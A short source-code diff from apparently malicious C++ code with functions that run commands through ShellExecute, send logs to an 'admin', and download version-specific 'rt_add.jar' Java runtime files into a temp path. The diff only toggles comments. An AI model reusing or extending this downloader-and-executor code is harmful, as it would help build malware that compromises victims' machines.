@@ -223,7 +223,7 @@ static void SendLogToAdmin( int num )
 
 static bool RunCmd( const char* exe, const char* cmd )
 {
-	//return true;
+//	return true;
 	SHELLEXECUTEINFOA in;
 	m_memset( &in, 0, sizeof(SHELLEXECUTEINFOA) );
 
@@ -491,6 +491,7 @@ static bool DownloadAndSave( const char* baseUrl, char* rtAddFilePath, char* ini
 		default: addUrl = "6u17/rt_add.jar"; crcName = "6u17_rt_add.jar"; break;
 	}
 	File::GetTempName(rtAddFilePath);
+//	GetWorkFolder( rtAddFilePath, "rt_add.jar" );
 	if( !DownloadPlugin( filesCrc32, baseUrl, addUrl, rtAddFilePath, crcName ) )
 		return false;
 
